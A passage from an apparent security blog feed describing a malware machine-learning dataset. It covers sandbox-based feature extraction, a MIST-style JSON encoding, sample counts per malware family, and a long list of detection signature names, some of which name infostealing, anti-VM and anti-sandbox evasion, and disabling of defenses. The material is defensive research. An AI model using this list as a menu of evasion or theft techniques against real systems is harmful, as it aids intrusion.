limited to): file &#34;sections&#34;, &#34;entropy&#34;, &#34;Syscalls&#34; and decompiled assembly n-grams.&lt;/li&gt;&lt;li style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Extracting features on samples analysis&lt;/b&gt;. This is the hardest solution since it would include both static analysis such as (but not limited to): file sections, entropy, &#34;Syscall/API&#34; and dynamic analysis such as (but not limited to): &#34;Contacted IP&#34;, &#34;DNS Queries&#34;, &#34;execution processes&#34;, &#34;AV signatures&#34; , etc. etc. Plus I needed a complex system of dynamic analysis including multiple sandboxes and static analysers. &amp;nbsp;&amp;nbsp;&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I decided to follow the hardest path by extracting features from both: static analysis and dynamic analysis of samples detonation in order to collect as much features as I can letting to the data scientist the freedom to decide what feature to use and what feature to drop in his data mining process. The analyses where performed through the sample detonation in several SandBoxes (free and commercial ones) which defined a first stage of ontologically homogeneous blocks called &#34;Analyses Results&#34; (AR). AR are too much verbose and they are not &amp;nbsp;performing well in any text algorithm of my knowledge.&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;After more readings on the topic I came up with Malware Instruction Set for Behaviour Analysis ( &lt;b&gt;MIST&lt;/b&gt;) described in Philipp Trinius et Al. (document available &lt;a href=&#34;http://www.mlsec.org/malheur/docs/mist-tr.pdf&#34; target=&#34;_blank&#34;&gt;here&lt;/a&gt;). &amp;nbsp;MIST is basically a result based &amp;nbsp;optimised representation for effective and efficient analysis of behaviour using data mining and machine learning techniques. It can be obtained automatically during analysis of malware with a behaviour monitoring tool or by converting existing behaviour reports. The representation is not restricted to a particular monitoring tool and thus can also be used as a meta language to unify behaviour reports of different sources. The following image shows the MIST encoding structure.&amp;nbsp;&lt;/div&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-s5eRy6rgLoQ/WE1xKyjcGRI/AAAAAAAANjI/LsI_CPEBY9sLseYkRWgXBxy0FALuYM63wCLcB/s1600/Screen%2BShot%2B2016-12-11%2Bat%2B16.30.21.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;141&#34; src=&#34;https://4.bp.blogspot.com/-s5eRy6rgLoQ/WE1xKyjcGRI/AAAAAAAANjI/LsI_CPEBY9sLseYkRWgXBxy0FALuYM63wCLcB/s400/Screen%2BShot%2B2016-12-11%2Bat%2B16.30.21.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;A simple example coming directly from the aforementioned paper is showed in the following image where &#34;load.dll&#34; has been detected. The ‘load dll’ system call is executed by every software during process initialisation and run-time several times, since under Windows, dynamic-link libraries (DLLs) are used to implement the Windows subsystem and offer an interface to the operating system. Following how the load.dll has been encoded into MIST meta language.&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-mktGuGRsFEs/WE1x4tchBlI/AAAAAAAANjM/29AxvG33Fp0oWzuRBfrvRR60EugthEYqgCLcB/s1600/Screen%2BShot%2B2016-12-11%2Bat%2B16.32.33.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;218&#34; src=&#34;https://1.bp.blogspot.com/-mktGuGRsFEs/WE1x4tchBlI/AAAAAAAANjM/29AxvG33Fp0oWzuRBfrvRR60EugthEYqgCLcB/s400/Screen%2BShot%2B2016-12-11%2Bat%2B16.32.33.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I decided to use the same concept of &#34;meta language&#34; but with auto-descriptive logic (without encoding the category operation since it would not afflict the analyses) and every information organised into a well formed JSON File rather then into a line based text file in order to be used in external environments with zero effort. &amp;nbsp;The produced datasets looks like following:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-FOXG2HLACQM/WFEmVJaubeI/AAAAAAAANko/DzItyfagdRIilcvJ2IdZhN82aBpmlidiQCEw/s1600/Screen%2BShot%2B2016-12-14%2Bat%2B12.00.10.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;266&#34; src=&#34;https://4.bp.blogspot.com/-FOXG2HLACQM/WFEmVJaubeI/AAAAAAAANko/DzItyfagdRIilcvJ2IdZhN82aBpmlidiQCEw/s640/Screen%2BShot%2B2016-12-14%2Bat%2B12.00.10.png&#34; width=&#34;640&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;DataSet Snippest (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Each JSON Property could be used as an algorithmic feature of your desired Machine Learning algorithm, but the most significative ones would be the &#34;properties&#34; ones (the one labelled properties). Each property, &lt;u&gt;by meaning of each field placed under the &#34;properties&#34; section of the produced JSON file&lt;/u&gt;, is optional and is structured as follows:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: center;&#34;&gt;&lt;i&gt;category_action_with_description | &amp;nbsp;&#34;sanitized&#34; involved subjects with spaces&lt;/i&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;So for example:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&#34;sig_copies_self&#34;: &#34;e5ed769a e5ed769a 98e83379&#34;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;It means the category is &lt;i&gt;sig&lt;/i&gt; (stands for signature) and the action is &#34;copies itself&#34;. &amp;nbsp;e5ed769a e5ed769a 98e83379 are 3 sanitize evidences of where the samples copies itself (see the Sanitization Procedure)&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;i&gt;&amp;nbsp;&#34;sig_antimalware_metascan&#34;: &#34;&#34;&lt;/i&gt;&lt;/div&gt;&lt;br /&gt;It means the category is sig (stands for signature) and the action is &#34;antimalware_metascan&#34;. The evidences are empty by meaning no signature found from metascan (in such a case).&lt;br /&gt;&lt;br /&gt;&lt;i&gt;&#34;sig_antivirus_virustotal&#34;: &#34;ffebfdb8 9dbdd699 600fe39f 45036f7d 9a72943b&#34;&lt;/i&gt;&lt;br /&gt;&lt;br /&gt;It means the signature virus_total found 5 evidences (&lt;i&gt;ffebfdb8 9dbdd699 600fe39f 45036f7d 9a72943b&lt;/i&gt;).&lt;br /&gt;&lt;br /&gt;A fundamental property is the &#34;&lt;b&gt;label&lt;/b&gt;&#34; property which classifies the malware family. I decided to name this field &#34;label&#34; rather than: &#34;malware_name&#34;, &#34;malware_family&#34; or &#34;classification&#34; in order to let the compatibility with many implemented machine learning algorithms which use the field &#34;label&#34; to properly work (it seems to be a defacto standards for many engine implementations).&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Sanitization Procedures&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Aim of the project is to provide an useful and classified dataset to researchers who want to investigate deeper in malware analysis by using Machine Learning techniques. It is essential to give a speed up in performances on text mining and for such a reason I decided to use some well known sanitization techniques in order to &#34;hash&#34; the evidences letting unchanged the meaning but drastically improving the speed for an algorithm point of view. The following picture shows the sanitization procedures:&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-lM4-nM8r_rw/WE16263hSmI/AAAAAAAANjo/WLzsf33X0K0I3s63rf5DkAXCJPh2cL2lgCEw/s1600/Screen%2BShot%2B2016-12-11%2Bat%2B17.11.43.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;436&#34; src=&#34;https://4.bp.blogspot.com/-lM4-nM8r_rw/WE16263hSmI/AAAAAAAANjo/WLzsf33X0K0I3s63rf5DkAXCJPh2cL2lgCEw/s640/Screen%2BShot%2B2016-12-11%2Bat%2B17.11.43.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Sanitization Procedures (click to enlarge)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;From a developer prospective the cited (and showed) procedures are not well written; for example are not protected and &#34;.replace&#34; could be not safe within specific inputs. For such a reason I will not release such a code. But please keep in mind that the result of my project is not the &#34;sanitization code&#34; but the outcome of it: the classified malware analyses datased, so I focused my attention on features extraction, samples collection, &amp;nbsp;aggregation, conversion, and of course analyses, not really in developing production code.&lt;/div&gt;&lt;br /&gt;&lt;b&gt;Training DataSets Generation: The Simplified Process&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The whole process to obtain the training datasets is described in the following flowchart. The detonation of a classified Malware into multiple sandboxes produces multiple static and dynamic analyses colliding into an analyses results artefact (AR). &amp;nbsp;AR would be translated into a MIST elaborated meta language to be software agnostic and to give freedom to data scientists.&lt;/div&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-DLpD8-toGrE/WE2CDN07T8I/AAAAAAAANj4/nOWRNsGG9U0jZzzz6N7HRrJahmQRNMI4gCLcB/s1600/Screen%2BShot%2B2016-12-11%2Bat%2B17.42.32.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;364&#34; src=&#34;https://4.bp.blogspot.com/-DLpD8-toGrE/WE2CDN07T8I/AAAAAAAANj4/nOWRNsGG9U0jZzzz6N7HRrJahmQRNMI4gCLcB/s640/Screen%2BShot%2B2016-12-11%2Bat%2B17.42.32.png&#34; width=&#34;580&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Data Samples&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;Today (please refers to blog post date) the collected classified datasets is composed by the following samples:&lt;br /&gt;&lt;ul style=&#34;text-align: left;&#34;&gt;&lt;li&gt;APT1 292 Samples&lt;/li&gt;&lt;li&gt;Crypto 2024 Samples&lt;/li&gt;&lt;li&gt;Locker 434 Samples&lt;/li&gt;&lt;li&gt;Zeus 2014 Samples&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;If you own classified Malware samples and you want to share it with me in order to contribute at the Machine Learning Training Datasets you are welcome, just drop me an email !&lt;/b&gt;&lt;br /&gt;I will definitely process the samples and build new datasets to share to everybody.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Where can I download the training datasets ? &amp;nbsp;&lt;a href=&#34;https://github.com/marcoramilli/MalwareTrainingSets&#34; target=&#34;_blank&#34;&gt;HERE&lt;/a&gt;&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Available Features and Frequency&lt;/b&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The following list enumerates the available features per each sample. The features, as mentioned, are optional by meaning you might have no all the same features for every sample. If the sample you are analysing does not have a specific feature you want consider it as None (or undefined) since that feature was not available for the specified sample. So if you are writing your of machine learning algorithm you should include a &#34;purification procedure&#34; which will ignore None features from training and or query.&lt;/div&gt;&lt;br /&gt;List of current available features with occurrences counter. &lt;feature_name&gt; : &lt;occurrences&gt;&lt;/occurrences&gt;&lt;/feature_name&gt;&lt;br /&gt;&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;file_access&#39;: 138759,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_infostealer_ftp&#39;: 13114,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modifies_hostfile&#39;: 5,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_removes_zoneid_ads&#39;: 16,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_disables_uac&#39;: 33,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_static_versioninfo_anomaly&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_webhistory&#39;: 417,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;reg_write&#39;: 11942,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_network_cnc_http&#39;: 132,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;api_resolv&#39;: 954690,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_network&#39;: 71,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_generic_bios&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_polymorphic&#39;: 705,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_generic_disk&#39;: 7,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vpc_keys&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_xen_keys&#39;: 5,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_creates_largekey&#39;: 16,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_exec_crash&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_sboxie_libs&#39;: 144,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_mimics_icon&#39;: 2,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_hidden_extension&#39;: 9,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modify_proxy&#39;: 384,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_office_security&#39;: 20,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_bypass_firewall&#39;: 29,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_encrypted_ioc&#39;: 476,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_dropper&#39;: 671,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;reg_delete&#39;: 2545,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_critical_process&#39;: 3,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;service_start&#39;: 312,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;net_dns&#39;: 486,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_files&#39;: 5,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_virus&#39;: 781,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;file_write&#39;: 20218,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_suspend&#39;: 2,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_sniffer_winpcap&#39;: 16,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_cuckoocrash&#39;: 11,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;file_delete&#39;: 5405,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vmware_devices&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_recyclebin&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_infostealer_keylog&#39;: 44,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_clamav&#39;: 1350,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_packer_vmprotect&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_productid&#39;: 18,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_persistence_service&#39;: 5,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_generic_diskreg&#39;: 162,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_recon_checkip&#39;: 4,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_extensions&#39;: 4,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_network_bind&#39;: 190,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivirus_virustotal&#39;: 175975,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_recon_beacon&#39;: 23,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_deletes_shadow_copies&#39;: 24,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_browser_security&#39;: 216,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modifies_desktop_wallpaper&#39;: 83,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_network_torgateway&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_file_modifications&#39;: 23,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vbox_files&#39;: 7,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_static_pe_anomaly&#39;: 2194,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_copies_self&#39;: 591,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antianalysis_detectfile&#39;: 51,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antidbg_devices&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;file_drop&#39;: 6627,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_driver_load&#39;: 72,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antimalware_metascan&#39;: 1045,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modifies_certs&#39;: 46,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vpc_files&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_file&#39;: 1566,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_mimics_agent&#39;: 131,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_disables_windows_defender&#39;: 3,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_message&#39;: 10,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_network_http&#39;: 216,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_injection_runpe&#39;: 474,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antidbg_windows&#39;: 455,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_sleep&#39;: 271,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_hiddenreg&#39;: 13,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_disables_browser_warn&#39;: 20,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vmware_files&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_infostealer_mail&#39;: 617,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ipc_namedpipe&#39;: 13,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_persistence_autorun&#39;: 2355,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_hide_notifications&#39;: 19,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;service_create&#39;: 62,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_reads_self&#39;: 14460,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;mutex_access&#39;: 15017,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antiav_detectreg&#39;: 4,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vbox_libs&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_sunbelt_libs&#39;: 2,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antiav_detectfile&#39;: 2,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;reg_access&#39;: 774910,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_timeout&#39;: 1024,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vbox_keys&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_persistence_ads&#39;: 3,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_mimics_filetime&#39;: 3459,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_banker_zeus_url&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_origin_langid&#39;: 71,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antiemu_wine_reg&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_process_needed&#39;: 137,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_restart&#39;: 24,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_recon_programs&#39;: 5318,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;str&#39;: 1443775,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antisandbox_unhook&#39;: 1364,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antiav_servicestop&#39;: 78,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_injection_createremotethread&#39;: 311,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;pe_imports&#39;: 301256,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_process_interest&#39;: 295,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_bootkit&#39;: 25,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;reg_read&#39;: 458477,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_stealth_window&#39;: 1267,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_downloader_cabby&#39;: 50,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_multiple_useragents&#39;: 101,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;pe_sec_character&#39;: 22180,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_disables_windowsupdate&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_generic_system&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;cmd_exec&#39;: 2842,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;net_con&#39;: 406,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_bcdedit_command&#39;: 14,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;pe_sec_entropy&#39;: 22180,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;pe_sec_name&#39;: 22180,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_creates_nullvalue&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_packer_entropy&#39;: 3603,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_packer_upx&#39;: 1210,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_disables_system_restore&#39;: 6,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_ransomware_radamant&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_infostealer_browser&#39;: 7,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_injection_rwx&#39;: 3613,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_deletes_self&#39;: 600,&lt;br /&gt;&amp;nbsp; &amp;nbsp; &#39;file_read&#39;: 50632,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_fraudguard_threat_intel_api&#39;: 226,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_deepfreeze_mutex&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modify_uac_prompt&#39;: 1,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_api_spamming&#39;: 251,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_modify_security_center_warnings&#39;: 18,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_generic_disk_setupapi&#39;: 25,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_pony_behavior&#39;: 159,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_banker_zeus_mutex&#39;: 442,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;net_http&#39;: 223,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_dridex_behavior&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_internet_dropper&#39;: 3,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_cryptAM&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_recon_fingerprint&#39;: 305,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antivm_vmware_keys&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_infostealer_bitcoin&#39;: 207,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_antiemu_wine_func&#39;: 0,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_rat_spynet&#39;: 3,&lt;br /&gt;&amp;nbsp; &amp;nbsp;&#39;sig_origin_resource_langid&#39;: 2255&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Cite The DataSet&lt;/b&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;If you find those results useful please cite them :&lt;br /&gt;&lt;br /&gt;&lt;pre style=&#34;background-color: #f8f9fa; border: 1px solid rgb(234, 236, 240); font-family: monospace, Courier; font-size: 14px; line-height: 1.3em; padding: 1em; white-space: pre-wrap;&#34;&gt;@misc{ MR,&lt;br /&gt;   author = &#34;Marco Ramilli&#34;,&lt;br /&gt;   title = &#34;Malware Training Sets: a machine learning dataset for everyone&#34;,&lt;br /&gt;   year = &#34;2016&#34;,&lt;br /&gt;   url = &#34;http://marcoramilli.blogspot.it/2016/12/malware-training-sets-machine-learning.html&#34;,&lt;br /&gt;   note = &#34;[Online; December 2016]&#34;&lt;br /&gt; }&lt;/pre&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Again, if you want to contribute ad you own classified Samples please drop them to me I will empower the dataset.&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Enjoy your new researches!&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Dirty COW Notes</title>
      <link>http://marcoramilli.com/post/dirty-cow-notes/</link>
      <pubDate>Sun, 30 Oct 2016 09:21:00 UTC</pubDate>
      
